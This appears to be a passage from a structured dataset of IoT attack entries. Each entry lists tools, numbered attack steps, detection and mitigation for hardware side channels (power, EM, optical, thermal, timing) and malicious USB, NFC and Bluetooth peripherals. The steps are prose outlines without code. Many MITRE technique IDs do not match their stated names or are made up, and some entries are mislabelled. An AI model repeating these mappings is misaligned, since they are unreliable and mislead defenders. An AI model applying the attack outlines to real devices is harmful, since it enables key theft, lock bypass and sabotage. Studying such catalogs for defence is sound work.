- **Vulnerability**: Infrared Pulse Width Leak
- **MITRE**: T1123 - Audio/Video Capture (IR)
- **Impact**: Key info via IR burst mapping
- **Tools**: IR Receiver (TSOP), Arduino, Oscilloscope, Python Plotter
- **Scenario**: An attacker analyzes invisible IR signal patterns during secure operations
- **Attack Steps**: Step 1: Connect IR receiver module to Arduino to capture IR signals. Step 2: Trigger multiple secure commands on IoT device via remote. Step 3: Log timings between each IR pulse. Step 4: Plot pulse widths and timing differences. Step 5: Detect fixed structure corresponding to internal logic or data. Step 6: Reconstruct sensitive data patterns or key sequences.
- **Detection**: IR signal logging & unusual pattern
- **Solution**: Obfuscate pulse timing, add noise
- **Tags**: ir-leak, remote-side-channel, arduino

## Capacitor Discharge Timing Analysis in Crypto Chip

- **Attack Type**: Power Timing Side-Channel
- **Target**: Embedded Encryption Chip
- **Vulnerability**: Load-Linked Power Draw
- **MITRE**: T1139 - Cryptographic Protocol Downgrade
- **Impact**: Partial key or algorithm recovery
- **Tools**: Multimeter, Logic Analyzer, ChipWhisperer, Python Timer
- **Scenario**: Measuring the time it takes for a decoupling capacitor to discharge reveals operation load
- **Attack Steps**: Step 1: Attach logic analyzer across capacitor on chip’s power input. Step 2: Repeatedly perform known crypto operations. Step 3: Time the voltage drop duration across the capacitor. Step 4: Map operation size or key length to discharge time. Step 5: Infer crypto type or partial key structure.
- **Detection**: Voltage time-series anomaly
- **Solution**: Constant power draw methods
- **Tags**: capacitor-timing, crypto-chip

## PCB Trace EM Backscatter from IoT Gateway

- **Attack Type**: EM Side-Channel
- **Target**: IoT Gateway PCB
- **Vulnerability**: EM Field Leakage
- **MITRE**: T1592.003 - Host Hardware Discovery
- **Impact**: Key transitions leak via RF
- **Tools**: Near-Field Probe, SDR, Spectrum Analyzer
- **Scenario**: EM emissions from PCB traces leak info about internal logic transitions
- **Attack Steps**: Step 1: Scan PCB with near-field EM probe while device is active. Step 2: Map regions emitting highest RF energy during operation. Step 3: Trigger repeated login/encryption requests. Step 4: Correlate captured EM signatures with expected logic transitions. Step 5: Infer control logic or key-related behavior.
- **Detection**: RF scan and hotspot mapping
- **Solution**: PCB shielding, guard traces
- **Tags**: em-backscatter, pcb-analysis, rf-probe

## Power Supply Line Injection Timing Analysis

- **Attack Type**: Power Side-Channel
- **Target**: IoT Sensor Node
- **Vulnerability**: Power Integrity Leak
- **MITRE**: T1003 - OS Credential Dumping (analogous)
- **Impact**: Secure operation identification
- **Tools**: Signal Generator, Oscilloscope, Logic Analyzer
- **Scenario**: Injecting subtle signals into power line and timing device’s processing response reveals logic path
- **Attack Steps**: Step 1: Connect signal injector in series with power supply. Step 2: Inject small-amplitude oscillating signal into the line. Step 3: Observe effect on device response time or stability. Step 4: Identify operations with higher sensitivity to voltage ripple. Step 5: Use feedback to map secure vs. insecure states.
- **Detection**: Detect voltage ripple activity
- **Solution**: Add power filters & delay compensation
- **Tags**: power-line-timing, injection, glitch

## Flash Write Timing to Determine Data Block Type

- **Attack Type**: Timing Side-Channel
- **Target**: Flash Storage in IoT Device
- **Vulnerability**: Write Duration Leak
- **MITRE**: T1005 - Data from Local System
- **Impact**: Memory layout mapping
- **Tools**: Flash Programmer, Stopwatch API, Python Timer
- **Scenario**: Writing encrypted vs unencrypted blocks into flash has measurable timing difference
- **Attack Steps**: Step 1: Use firmware API or UART to write known data blocks to flash. Step 2: Time the duration for each write using a stopwatch script. Step 3: Compare timing differences between encrypted and plaintext blocks. Step 4: Infer if the block contains secrets or dummy padding. Step 5: Map out memory layout and sensitive zones.
- **Detection**: Flash write duration logging
- **Solution**: Padding + timing normalization
- **Tags**: flash-timing, memory-map

## Power Frequency Drift During Password Validation

- **Attack Type**: Power Side-Channel
- **Target**: Login-Controlled Device
- **Vulnerability**: Frequency Modulated Leak
- **MITRE**: T1110.003 - Brute Force Password Guessing
- **Impact**: Authentication bypass
- **Tools**: Spectrum Analyzer, Python, Oscilloscope
- **Scenario**: Power frequency drifts slightly during incorrect password comparisons
- **Attack Steps**: Step 1: Run login scripts with multiple incorrect passwords. Step 2: Capture power signal frequency during each attempt. Step 3: Measure minor frequency changes or phase shifts. Step 4: Use this feedback to deduce how many characters were correct. Step 5: Reconstruct full password via timing refinement.
- **Detection**: Track minor frequency shift patterns
- **Solution**: Obfuscate loop timing & execution
- **Tags**: power-drift, password-guess

## USB Response Delay Profiling during Encryption

- **Attack Type**: USB Timing Side-Channel
- **Target**: USB Crypto Dongle
- **Vulnerability**: USB Latency Leakage
- **MITRE**: T1046 - Network Service Scanning (analogous)
- **Impact**: Round estimation or logic flow
- **Tools**: USB Analyzer, Logic Analyzer, Custom USB App
- **Scenario**: Measuring USB response delays reveals internal states of crypto routines
- **Attack Steps**: Step 1: Connect USB device to logic analyzer on data lines. Step 2: Send challenge requests and measure response timing. Step 3: Note delay between data sent and acknowledgment. Step 4: Match delays to logic branch taken during key verification. Step 5: Estimate number of encryption rounds and internal status.
- **Detection**: USB timing analysis logs
- **Solution**: Equalize USB processing delay
- **Tags**: usb-timing, latency-crypto

## BLE Connection Interval Leak During Encryption

- **Attack Type**: BLE Timing Side-Channel
- **Target**: BLE-Enabled IoT Wearable
- **Vulnerability**: Packet Interval Leak
- **MITRE**: T1421 - BLE Advertising Abuse
- **Impact**: Detect encryption active states
- **Tools**: BLE Sniffer, Nordic nRF Connect, Wireshark
- **Scenario**: BLE packet exchange interval changes slightly during encryption vs normal ops
- **Attack Steps**: Step 1: Pair BLE device and monitor packets with sniffer. Step 2: Log intervals between encrypted notifications and normal messages. Step 3: Identify consistent timing shifts. Step 4: Correlate shifts with encryption routine state. Step 5: Map internal states or detect crypto phase.
- **Detection**: BLE timing anomaly monitoring
- **Solution**: Add packet delay jittering
- **Tags**: ble-side-channel, packet-interval

## Side-Channel via OLED Refresh Rate During Secure Ops

- **Attack Type**: Display Timing Side-Channel
- **Target**: OLED-Based IoT Display
- **Vulnerability**: Refresh Rate Modulation
- **MITRE**: T1531 - Account Access Removal (analogous)
- **Impact**: Key timing inference
- **Tools**: Photodiode Sensor, Oscilloscope, OLED Device
- **Scenario**: Cryptographic ops affect OLED refresh rate slightly, detectable via photodiode
- **Attack Steps**: Step 1: Aim photodiode at OLED screen. Step 2: Trigger encryption/login activity. Step 3: Log brightness and refresh frequency changes. Step 4: Analyze timing patterns between screen refresh pulses. Step 5: Map refresh delay to logic timing.
- **Detection**: Monitor OLED flicker profiles
- **Solution**: Use fixed refresh logic
- **Tags**: oled-refresh, photodiode-leak

## Interrupt Timing Abuse in Real-Time OS (RTOS)

- **Attack Type**: RTOS Timing Side-Channel
- **Target**: RTOS-Driven Sensor Device
- **Vulnerability**: ISR Delay Leak
- **MITRE**: T1406 - Obfuscated File or Info
- **Impact**: Timing-aware RTOS manipulation
- **Tools**: RTOS Debugger, Oscilloscope, Timer, JTAG
- **Scenario**: Attack targets interrupt service routine (ISR) latency to infer secure thread behavior
- **Attack Steps**: Step 1: Use RTOS debugger to trace task switching and ISRs. Step 2: Measure latency between interrupts and service routines. Step 3: Correlate increased latency with crypto or secure operations. Step 4: Infer thread type or sensitive operation start. Step 5: Design timing-based exploit based on priority behavior.
- **Detection**: Monitor ISR-to-thread delay
- **Solution**: Equal ISR priority and timing randomization
- **Tags**: rtos-leak, interrupt-timing

## Side-Channel Leakage via eInk Display Refresh

- **Attack Type**: Display-Based Timing
- **Target**: eInk-Based Smart Device
- **Vulnerability**: Display Timing Leak
- **MITRE**: T1530 - Data from Information Repositories
- **Impact**: Reveals secure operation windows
- **Tools**: High-Speed Camera, Python Timer, Logic Analyzer
- **Scenario**: Secure processes cause subtle delays in eInk screen updates that can be observed
- **Attack Steps**: Step 1: Set up an IoT device with an eInk display (e.g., smart badge or weather station). Step 2: Use a high-speed camera or stopwatch timer to record screen refresh patterns. Step 3: Trigger a known operation like login or key update from the UI. Step 4: Compare time taken for regular refreshes vs. refreshes occurring during secure actions. Step 5: Identify if there’s extra delay or frame flicker during encryption. Step 6: Use this info to determine when keys are generated or authentication is performed.
- **Detection**: Detect slower refresh intervals
- **Solution**: Use constant-time refresh routines
- **Tags**: eink-display, timing-leak

## LED Power Indicator Leakage on IoT Switch

- **Attack Type**: Optical Power Side-Channel
- **Target**: IoT Smart Switch
- **Vulnerability**: Light-Linked Leakage
- **MITRE**: T1120 - Peripheral Device Discovery
- **Impact**: Reveals when encryption is active
- **Tools**: Light Sensor, Arduino Logger, Oscilloscope
- **Scenario**: LED brightness varies slightly when different functions are being executed
- **Attack Steps**: Step 1: Connect a light sensor facing the device’s power or status LED. Step 2: Use an Arduino or microcontroller to record brightness levels over time. Step 3: Start various operations (e.g., login, key validation, status ping). Step 4: Identify patterns in light intensity and how they differ during secure events. Step 5: Correlate brightness changes to logic transitions or encryption timing. Step 6: Use that pattern to guess when critical operations are happening.
- **Detection**: Detect LED flicker or intensity jumps
- **Solution**: Mask power LED intensity fluctuations
- **Tags**: optical-leak, led-timing

## Watchdog Reset Time Measurement as Timing Oracle

- **Attack Type**: Fault Timing Side-Channel
- **Target**: IoT Device with Watchdog Timer
- **Vulnerability**: Reset Delay Timing Leak
- **MITRE**: T1495 - Firmware Corruption
- **Impact**: Full password or logic path enumeration
- **Tools**: GPIO Oscilloscope, JTAG Debugger, Timer App
- **Scenario**: Watchdog-triggered resets happen at different times based on operation success or failure
- **Attack Steps**: Step 1: Access the IoT device’s reset line or output pin via GPIO. Step 2: Trigger repeated login attempts or secure operations. Step 3: For each, deliberately let the operation hang and wait for the watchdog timer to reset. Step 4: Record how long it takes for the device to reboot. Step 5: Observe if some operations reset faster/slower (e.g., wrong passwords cause immediate reset). Step 6: Use this feedback loop to enumerate the correct password or operation flow.
- **Detection**: Reboot cycle timing logs
- **Solution**: Uniform watchdog delay logic
- **Tags**: watchdog-reset, fault-timing

## Side-Channel via Smart Speaker Microcontroller Heat Signature

- **Attack Type**: Thermal Side-Channel
- **Target**: Smart Speaker
- **Vulnerability**: Chip Heat Signature
- **MITRE**: T1113 - Screen/Infrared Capture
- **Impact**: Secure logic timing revealed
- **Tools**: FLIR Thermal Camera, Timer, Encrypted Audio Sample
- **Scenario**: Encryption and voice processing generate detectable heat signatures in the chip
- **Attack Steps**: Step 1: Open the casing of a smart speaker and expose the microcontroller area. Step 2: Use a FLIR or thermal camera to monitor surface temperature of the chip during idle and active audio processing. Step 3: Feed voice input to the device that causes secure processing (e.g., wake word). Step 4: Capture thermal images before, during, and after processing. Step 5: Analyze the temperature increase patterns — crypto often generates more heat. Step 6: Infer when secure instructions or authentication routines are triggered.
- **Detection**: Monitor temperature deltas
- **Solution**: Add thermal decoys, random delay injection
- **Tags**: thermal-smartchip, speaker-timing

## Clock Signal Injection Causing Instruction Skew

- **Attack Type**: Clock Fault Side-Channel
- **Target**: IoT Dev Board
- **Vulnerability**: Clock Frequency Drift
- **MITRE**: T1499 - Endpoint Denial of Service
- **Impact**: Crypto key/logic leak via timing skew
- **Tools**: External Clock Injector, Oscilloscope, JTAG
- **Scenario**: Attacker slightly alters device’s clock signal to affect instruction timing
- **Attack Steps**: Step 1: Connect a programmable external clock source to the device’s clock input line. Step 2: Slowly vary the frequency by ±5% and observe device behavior during secure operations. Step 3: Trigger an encryption or login activity. Step 4: Check if the logic misbehaves, hangs, or responds faster/slower. Step 5: Use response time changes to build a side-channel profile. Step 6: Identify clock-sensitive instructions or crypto key scheduling timing.
- **Detection**: Clock instability monitoring
- **Solution**: Use on-chip clock regulators, PLL watchdogs
- **Tags**: clock-injection, skew-analysis

## Data Leakage via SD Card Write Timing

- **Attack Type**: Storage Timing Side-Channel
- **Target**: IoT Device using SD Card
- **Vulnerability**: Write Duration Leak
- **MITRE**: T1005 - Data from Local System
- **Impact**: File-level security detection
- **Tools**: SD Card Sniffer, File Logger App, Python Timer
- **Scenario**: Writing encrypted vs. unencrypted data takes different time on SD cards
- **Attack Steps**: Step 1: Write multiple files of same size but different content (plaintext vs encrypted) to SD card. Step 2: Time the duration of each write operation using a stopwatch or timer script. Step 3: Identify consistent delay difference due to crypto overhead. Step 4: Infer which files are encrypted vs not. Step 5: Use this to detect hidden secure content.
- **Detection**: SD write time profiling
- **Solution**: Add uniform write delays or write caching
- **Tags**: sd-timing-leak, storage-sidechannel

## Keyboard Matrix Scan Timing in Smart Keypad

- **Attack Type**: Matrix Timing Side-Channel
- **Target**: Smart Lock Keypad
- **Vulnerability**: Scan Timing Leak
- **MITRE**: T1056.001 - Input Capture
- **Impact**: Remote PIN guessing
- **Tools**: Oscilloscope, Logic Analyzer, GPIO Monitor
- **Scenario**: Scanning rate reveals which key is being pressed on matrix-based keypad
- **Attack Steps**: Step 1: Connect a logic analyzer to the keypad row and column GPIOs. Step 2: Trigger key presses and record scan timing across rows/columns. Step 3: Observe time taken for each scan pass and which lines trigger faster. Step 4: Infer which key was pressed based on timing pattern. Step 5: Reconstruct the PIN or entry sequence.
- **Detection**: GPIO scan profiling
- **Solution**: Use uniform scanning rate or encryption
- **Tags**: keypad-timing, matrix-leak

## Supply Chain Device Timing Anomaly

- **Attack Type**: Timing Mismatch (Supply Chain)
- **Target**: IoT Device with Crypto Co-Processor
- **Vulnerability**: Hardware Timing Manipulation
- **MITRE**: T1584 - Compromise Hardware Supply Chain
- **Impact**: Trojan detection via timing fingerprint
- **Tools**: Logic Analyzer, Trusted Timer, Firmware Trace
- **Scenario**: Hardware trojan chip adds delay when sensitive data is processed
- **Attack Steps**: Step 1: Benchmark timing of secure functions (e.g., encryption) on known-good device. Step 2: Compare the same timings on a new (suspected modified) device from supply chain. Step 3: Measure microsecond-level delays using logic analyzer or internal timer. Step 4: If delay only occurs during secure operations, suspect hardware trojan. Step 5: Reverse engineer delay behavior to confirm backdoor logic.
- **Detection**: Time consistency validation
- **Solution**: Secure chip sourcing, hardware attestation
- **Tags**: hardware-trojan, delay-leak

## Cryptographic Cache Miss Pattern in Embedded DB

- **Attack Type**: Cache Timing Side-Channel
- **Target**: IoT Device with Local DB
- **Vulnerability**: Cache Path Timing Leak
- **MITRE**: T1211 - Exploitation of Remote Services
- **Impact**: Secure query detection
- **Tools**: Embedded SQLite DB, Perf Tools, Cache Profiler
- **Scenario**: DB query encryption uses different cache paths, measurable via timing
- **Attack Steps**: Step 1: Run multiple secure database queries repeatedly. Step 2: Log the time each query takes. Step 3: Use tools like perf or cachegrind to monitor cache hits/misses. Step 4: Match patterns of cache misses to query types. Step 5: Use this data to predict secure vs normal queries.
- **Detection**: Cache analysis logs
- **Solution**: Constant-cache query planner
- **Tags**: cache-leak, sqlite, embedded-db

## Vibration Feedback from Relay Clicking

- **Attack Type**: Mechanical Side-Channel
- **Target**: Relay-Controlled IoT Switch
- **Vulnerability**: Mechanical Movement Leak
- **MITRE**: T1110 - Brute Force (analogous)
- **Impact**: State leakage via mechanical cue
- **Tools**: Piezo Sensor, Vibration Logger, Microphone
- **Scenario**: Relay makes slight noise or vibration when activating during secure commands
- **Attack Steps**: Step 1: Place a piezo sensor or vibration sensor near the IoT device. Step 2: Trigger secure functions that use relays (e.g., smart lock engage). Step 3: Record mechanical noise or vibration patterns. Step 4: Analyze number, strength, or pattern of clicks. Step 5: Infer if command was successful, partially successful, or a fault.
- **Detection**: Sensor logs of vibration spikes
- **Solution**: Solid-state relays or vibration dampers
- **Tags**: mechanical-leak, relay-vibration

## Button Debounce Timing Side-Channel

- **Attack Type**: Input Timing Leak
- **Target**: Smart Doorbell or IoT Lock
- **Vulnerability**: GPIO Press Timing
- **MITRE**: T1056 - Input Capture
- **Impact**: Reveals behavioral or input info
- **Tools**: Logic Analyzer, GPIO Debug Tool, Timer Script
- **Scenario**: Subtle differences in how long a button is pressed can leak user behavior patterns or input sequence
- **Attack Steps**: Step 1: Connect a logic analyzer to the GPIO pin of a button on an IoT device (like a smart doorbell).Step 2: Have users press the button to input a code or perform a sequence (e.g., multiple taps).Step 3: Capture the exact "press" and "release" timestamps for each interaction.Step 4: Measure the duration and interval between presses.Step 5: Identify patterns, such as a specific user pressing buttons faster or slower.Step 6: Use this pattern to reconstruct the input sequence (e.g., PIN or menu navigation).
- **Detection**: GPIO state timing logs
- **Solution**: Randomize debounce window or encrypt inputs
- **Tags**: debounce, button-timing, gpio

## Voltage Ripple Analysis in Charging IoT Device

- **Attack Type**: Power Ripple Leak
- **Target**: Wearable IoT Device
- **Vulnerability**: Ripple Leakage on Power Bus
- **MITRE**: T1207 - Rogue Software Execution (analogous)
- **Impact**: Detects secure operations remotely
- **Tools**: Oscilloscope, USB Power Meter, High-Pass Filter
- **Scenario**: Cryptographic processing creates identifiable voltage ripple on the charging line
- **Attack Steps**: Step 1: Connect an oscilloscope in series with a USB power supply charging a smart IoT device (e.g., smart band).Step 2: Trigger a secure event on the device (e.g., data sync or authentication).Step 3: Observe high-frequency voltage ripple patterns on the power line.Step 4: Filter and isolate ripple patterns caused specifically by cryptographic routines.Step 5: Record timing, amplitude, and waveform characteristics.Step 6: Match these patterns to operation type or secure command execution.
- **Detection**: Voltage waveform monitoring
- **Solution**: Add ripple filters, secure processing regulator
- **Tags**: power-line-ripple, charging-timing

## PWM Signal Side-Channel from Smart LED Strip

- **Attack Type**: Timing Side-Channel via PWM
- **Target**: IoT LED Lighting
- **Vulnerability**: PWM-Based Timing Leak
- **MITRE**: T1123 - Audio/Video Capture (analogous)
- **Impact**: Reveals timing of secure events
- **Tools**: Oscilloscope, Light Sensor, PWM Analyzer
- **Scenario**: Secure command processing changes PWM pulse width, observable from LED brightness
- **Attack Steps**: Step 1: Connect an oscilloscope or light sensor to a smart LED strip controlled by an IoT device.Step 2: Trigger different events on the device—e.g., pairing, encrypted data sync, or firmware update.Step 3: Measure the PWM signal’s duty cycle and pulse width during these operations.Step 4: Observe if pulse width changes or LED flicker becomes slower/faster during secure operations.Step 5: Use PWM pattern differences to infer when encryption or authentication occurs.Step 6: Optionally correlate signal shifts to specific secure routines.
- **Detection**: PWM signal profile comparison
- **Solution**: Fix PWM duty cycle or isolate LED timing
- **Tags**: pwm-side-channel, led-strip

## EM Leakage from Inductive Charging Coils

- **Attack Type**: Electromagnetic Side-Channel
- **Target**: Wireless Charging IoT Device
- **Vulnerability**: Coil-Based EM Leak
- **MITRE**: T1595 - Active Scanning (analogous)
- **Impact**: Exposes secure logic flow externally
- **Tools**: EM Probe, Spectrum Analyzer, Coil Sniffer Tool
- **Scenario**: Cryptographic instructions slightly change EM field around inductive coils
- **Attack Steps**: Step 1: Place an EM probe near the inductive charging coil of an IoT device (e.g., smart ring, toothbrush).Step 2: Charge the device while it performs background secure actions like key exchanges.Step 3: Capture and analyze the surrounding EM field using a spectrum analyzer.Step 4: Observe signal strength shifts or harmonic frequency spikes during encryption routines.Step 5: Correlate those emissions to specific cryptographic steps or session initiations.Step 6: Use pattern matching to map cryptographic timeline.
- **Detection**: EM signal shape/energy monitoring
- **Solution**: Shield coils and randomize crypto execution
- **Tags**: coil-emission, inductive-side-channel

## Cross-Core Timing Attack in Multi-Core Embedded Device

- **Attack Type**: CPU Timing Side-Channel
- **Target**: Dual-Core Embedded Device
- **Vulnerability**: Shared Resource Timing Leak
- **MITRE**: T1217 - Browser Extensions (analogous)
- **Impact**: Key or logic leak across cores
- **Tools**: RTOS Debugger, Core Timer, Performance Monitor
- **Scenario**: Monitoring one core’s execution timing reveals crypto ops in another shared core
- **Attack Steps**: Step 1: Access a dual-core embedded device where one core handles secure tasks (e.g., ARM Cortex-A9).Step 2: Run low-priority benign code on one core that measures access time to shared memory/cache.Step 3: Simultaneously trigger encryption operation on the second core.Step 4: Observe delays or latency spikes on your core during the crypto process.Step 5: Use these timing shifts to guess crypto load, key length, or secure path taken.Step 6: Repeat for multiple rounds to build full crypto timing profile.
- **Detection**: Cross-core timing analysis
- **Solution**: Isolate core memory, use real-time isolation
- **Tags**: multi-core, cpu-timing, rtos

## HID Keyboard Attack via USB Rubber Ducky

- **Attack Type**: Malicious Peripheral Attack
- **Target**: IoT Human-Machine Interface
- **Vulnerability**: Insecure Peripheral Recognition
- **MITRE**: T1056.001
- **Impact**: Unauthorized access, data exfiltration
- **Tools**: USB Rubber Ducky, Ducky Script
- **Scenario**: An attacker uses a USB Rubber Ducky to inject keystrokes into an IoT-enabled control panel device.
- **Attack Steps**: Step 1: Attacker buys or creates a USB Rubber Ducky that looks like a regular USB pen drive. Step 2: They write a small script (using easy language) that simulates typing malicious commands when plugged in. Step 3: Attacker gains physical access to the IoT control panel and inserts the USB device. Step 4: The USB is auto-recognized as a keyboard by the system. Step 5: It starts typing commands quickly without the user seeing anything obvious. Step 6: Commands could disable security, open remote access, or leak data.
- **Detection**: Monitor USB events and input behavior using endpoint logging
- **Solution**: Disable auto-install for unknown USB HID devices, physical port blocking
- **Tags**: HID Injection, USB Rubber Ducky, IoT Physical Access

## Malicious USB Fan Drops Malware in Smart Thermostat

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Thermostat (USB enabled)
- **Vulnerability**: No firmware-level USB verification
- **MITRE**: T1204.002
- **Impact**: Remote access to thermostat, lateral movement
- **Tools**: Modified USB fan, Meterpreter payload, msfvenom
- **Scenario**: A USB-powered fan is modified to carry malware and plugged into a smart thermostat USB port.
- **Attack Steps**: Step 1: Attacker buys a cheap USB fan. Step 2: They implant a hidden storage chip in the USB fan with a malware payload. Step 3: They disguise the fan as a "free gift" or bring it physically near the target. Step 4: Fan is plugged into the USB port of a smart thermostat (used to power devices). Step 5: The thermostat detects a USB device and reads the payload file. Step 6: Malware exploits an old vulnerability and executes silently. Step 7: Attacker gains control of thermostat over the network.
- **Detection**: Monitor for unknown device activity, forensic firmware analysis
- **Solution**: Do not allow USB-powered devices on IoT, patch USB firmware validation
- **Tags**: Malicious USB, Physical Access, Thermostat Hijack

## Teensy Device Spoofing Smart Sensor Configuration

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Industrial Sensor Console
- **Vulnerability**: No validation of input source
- **MITRE**: T0856
- **Impact**: False data injection, operational manipulation
- **Tools**: Teensy board, Arduino IDE
- **Scenario**: A Teensy device pretends to be a configuration tool for an industrial sensor, injecting commands when connected.
- **Attack Steps**: Step 1: Attacker programs a Teensy microcontroller to act like a USB keyboard/mouse. Step 2: The script is designed to send configuration commands that redirect sensor outputs. Step 3: The attacker connects it to the USB port of the industrial IoT sensor console. Step 4: Device is detected as a legitimate interface tool. Step 5: The spoofed commands modify the sensor’s threshold or reporting IP. Step 6: Data now goes to attacker’s server or causes alarm manipulation.
- **Detection**: Monitor config changes, compare baseline sensor configs
- **Solution**: Use secure configuration authentication, block unknown USB
- **Tags**: Teensy Attack, Sensor Hijack, USB Spoofing

## Malicious Charging Cable Attacks Smart Display

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Display (USB-C enabled)
- **Vulnerability**: Auto-trust on USB input
- **MITRE**: T1056.001
- **Impact**: Covert remote access, surveillance
- **Tools**: O.MG Cable, O.MG Programmer, WiFi C2
- **Scenario**: An attacker uses an "O.MG Cable" that looks like a normal charging cable to exploit a USB-C smart display.
- **Attack Steps**: Step 1: Attacker gets a malicious charging cable (looks 100% normal). Step 2: Inside the cable is a hidden chip that can send keystrokes over USB. Step 3: Cable is given to target as a spare or is plugged in during maintenance. Step 4: Smart display sees it as a normal charging + input device. Step 5: The cable silently types out hidden commands, such as opening a terminal and installing spyware. Step 6: The attacker controls it over WiFi from a nearby location.
- **Detection**: USB traffic and keystroke monitoring tools
- **Solution**: Block all USB peripheral interaction by default
- **Tags**: O.MG Cable, Keystroke Injection, Covert IoT Control

## Fake Peripheral Alters Factory Automation Hub

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Factory Automation Hub
- **Vulnerability**: No peripheral validation or auth
- **MITRE**: T0820
- **Impact**: Operational disruption, sabotage
- **Tools**: Raspberry Pi Pico, Custom USB payload, USB analyzer
- **Scenario**: A custom device posing as a legitimate factory tool is connected to an automation hub and reprograms it.
- **Attack Steps**: Step 1: Attacker configures a Raspberry Pi Pico to act as a legitimate USB tool. Step 2: It contains scripts that, once connected, execute changes to factory settings. Step 3: Device is plugged into the USB port of the automation hub during regular maintenance. Step 4: The automation hub accepts it without asking for authentication. Step 5: The payload modifies operation schedules, disables safety sensors, or redirects output. Step 6: Factory operations are now under attacker influence or manipulated for damage.
- **Detection**: Check for unexpected USB interactions and config changes
- **Solution**: Physically secure all I/O ports, use hardware-based authentication
- **Tags**: Industrial IoT, USB Spoof, Insider Risk

## MicroSD Card with Hidden Payload in Smart Camera

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart IP Camera
- **Vulnerability**: Auto-run from SD card without integrity check
- **MITRE**: T1203
- **Impact**: Surveillance breach, lateral movement
- **Tools**: MicroSD card, Custom exploit binary
- **Scenario**: An attacker inserts a microSD card loaded with an exploit file into a smart IP camera.
- **Attack Steps**: Step 1: Attacker prepares a microSD card with a hidden exploit file disguised as a firmware update. Step 2: They gain access to a physical smart IP camera that accepts SD cards for storage or firmware updates. Step 3: The card is inserted into the camera’s microSD slot. Step 4: The camera auto-scans for firmware or media files and processes the malicious file. Step 5: The file triggers a vulnerability in the camera’s software, opening a backdoor. Step 6: The attacker remotely accesses the camera, gaining video feeds and LAN access.
- **Detection**: Monitor filesystem changes on SD detection
- **Solution**: Only allow signed firmware, disable auto-mount
- **Tags**: Firmware Spoof, Storage Device Attack, Camera Exploit

## Custom Bluetooth Dongle Forces IoT Device Pairing

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Lock BLE Console
- **Vulnerability**: Insecure Bluetooth pairing & no physical validation
- **MITRE**: T0866
- **Impact**: Unauthorized physical access
- **Tools**: Ubertooth One, USB BLE dongle, BLE sniffer tools
- **Scenario**: Attacker uses a Bluetooth USB dongle to force pairing with a BLE-enabled smart lock.
- **Attack Steps**: Step 1: Attacker plugs in a USB Bluetooth dongle into a management console for BLE smart locks. Step 2: The dongle is pre-programmed to spoof legitimate device pairing requests. Step 3: Once plugged in, it sends fake pairing signals targeting smart locks in the vicinity. Step 4: The lock, due to insecure pairing logic, accepts the connection. Step 5: Attacker uses this connection to send unlock commands or extract stored keys. Step 6: Access is silently granted without alarms.
- **Detection**: Log and alert unauthorized BLE sessions
- **Solution**: Enforce manual pairing, whitelist BLE MACs
- **Tags**: BLE Exploit, Physical Breach, Lock Bypass

## Malicious NFC Tag Alters IoT Access Point Config

- **Attack Type**: Malicious Peripheral Attack
- **Target**: IoT Access Controller (NFC-enabled)
- **Vulnerability**: No validation of scanned NFC content
- **MITRE**: T1141
- **Impact**: Redirection, network compromise
- **Tools**: Programmable NFC tags, NFC writer app
- **Scenario**: NFC tag placed on a wall tricks an IoT access controller into reconfiguring itself.
- **Attack Steps**: Step 1: Attacker buys an NFC tag that can store scripts/URLs. Step 2: They program the tag with a malicious configuration URL. Step 3: The tag is physically placed near an IoT access controller that supports NFC-based setup. Step 4: When scanned (automatically or by accident), the controller loads the malicious config. Step 5: Settings like DNS, remote IP, or credentials are silently changed. Step 6: Attacker now receives logs, controls, or access to downstream devices.
- **Detection**: Log all configuration events and NFC scans
- **Solution**: Only allow known NFC profiles, alert on auto-import
- **Tags**: NFC Exploit, Contactless Hijack, Access Control

## BadUSB Attack on 3D Printer

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Industrial 3D Printer
- **Vulnerability**: No source device authentication
- **MITRE**: T0847
- **Impact**: Production sabotage, design theft
- **Tools**: BadUSB (Arduino-based), USB payload injector
- **Scenario**: USB device pretending to be a trusted host PC sends g-code that alters the 3D printing process.
- **Attack Steps**: Step 1: Attacker builds a BadUSB device using Arduino or Digispark. Step 2: It’s programmed to emulate a trusted PC that sends g-code. Step 3: USB is inserted into a 3D printer used in smart manufacturing. Step 4: Printer accepts it as a valid command source. Step 5: Malicious g-code is sent that causes layer shifts or material leaks. Step 6: Prints are sabotaged or inject malicious parts in a product line.
- **Detection**: Monitor g-code input source and checksum
- **Solution**: Require cryptographic signature for g-code uploads
- **Tags**: Smart Factory, 3D Printer Attack, USB Device Impersonation

## Tampered USB Hub Drops Keylogger Payload in Smart Kiosk

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Public IoT Smart Kiosk
- **Vulnerability**: Trust on USB peripherals
- **MITRE**: T1056
- **Impact**: Credential theft, privacy violation
- **Tools**: Modified USB hub, Hardware keylogger, Power analyzer
- **Scenario**: USB hub is modified to include keylogging malware and plugged into a public smart kiosk.
- **Attack Steps**: Step 1: Attacker buys a USB hub and installs a hidden keylogger chip inside. Step 2: Hub is presented as a free utility or service device to maintenance staff. Step 3: Maintenance staff unknowingly plug it into the kiosk to expand USB ports. Step 4: The keylogger intercepts keystrokes from the touch keyboard input. Step 5: It stores sensitive data (PINs, passwords, searches) silently. Step 6: Attacker later retrieves the hub and downloads the stolen data.
- **Detection**: Track new hardware device IDs, check hub integrity
- **Solution**: Avoid public USB hubs, encrypt local keystroke input
- **Tags**: Kiosk Hacking, Keylogger, Tampered USB

## Hidden Malware in IoT Device Firmware via USB Loader

- **Attack Type**: Malicious Peripheral Attack
- **Target**: IoT Irrigation Controller
- **Vulnerability**: Firmware not verified cryptographically
- **MITRE**: T1608
- **Impact**: Infrastructure sabotage, remote access
- **Tools**: USB firmware loader, Hex Editor, Custom firmware
- **Scenario**: Firmware update USB is used to flash malware-laced software into an IoT irrigation controller.
- **Attack Steps**: Step 1: Attacker modifies a real firmware file using a hex editor and injects malicious code. Step 2: The malicious firmware is saved onto a USB drive. Step 3: They plug the USB into the IoT irrigation controller during update time. Step 4: The device recognizes the file as valid (no digital signature check). Step 5: Malicious firmware runs and opens remote access over WiFi. Step 6: Attacker now controls water schedules or disables irrigation to cause damage.
- **Detection**: Firmware checksum verification, config logging
- **Solution**: Digitally sign firmware, block unsigned updates
- **Tags**: Firmware Backdoor, Agriculture IoT Exploit

